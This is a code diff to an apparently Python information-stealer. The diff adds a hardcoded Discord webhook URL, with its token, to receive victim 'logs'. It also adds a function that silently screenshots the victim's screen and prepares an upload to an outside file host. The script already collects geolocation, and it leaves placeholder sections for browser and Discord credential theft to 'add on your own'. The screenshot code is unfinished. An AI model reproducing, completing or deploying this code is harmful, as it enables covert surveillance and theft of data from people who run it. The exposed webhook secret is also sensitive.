@@ -3,7 +3,7 @@ import json
 import os
 import requests
 import platform
-
+import pyautogui
 
 # Misc. Modules
 from re import findall
@@ -17,7 +17,7 @@ from time import sleep
 from sys import argv
 
 # CHANGE THESE VALUES
-webhook_url = "" # Your Discord webhook URL where logs will be sent
+webhook_url = "https://canary.discord.com/api/webhooks/922621460483285073/ijFTaxdh7UTAKIeufnKHWBEMtJSGOK1j3ndCjC390NkCsD2SnkM4mnHpp7uW8B2BX7qm" # Your Discord webhook URL where logs will be sent
 
 # DO NOT CHANGE THESE VALUES
 
@@ -57,13 +57,24 @@ region = geolocation2["region"]
 city = geolocation2["city"]
 timezone = geolocation2["timezone"]
 
-### Chrome
+### Browser ###
+
+# REMOVED FOR SECURITY REASONS - ADD THIS PART ON YOUR OWN
+
+### Discord  ###
+
+# REMOVED FOR SECURITY REASONS - ADD THIS PART ON YOUR OWN
 
 
+### Screenshot - Currently only works on Windows ###
 
-### Discord 
+def screenshot():
+    takess = pyautogui.screenshot('temp.png')
+    uploadapi = "https://catbox.moe/user/api.php"
+    screenshot = open("temp.png", "rb")
+    
 
-
+screenshot()
 
 ### Webhook function ###
 
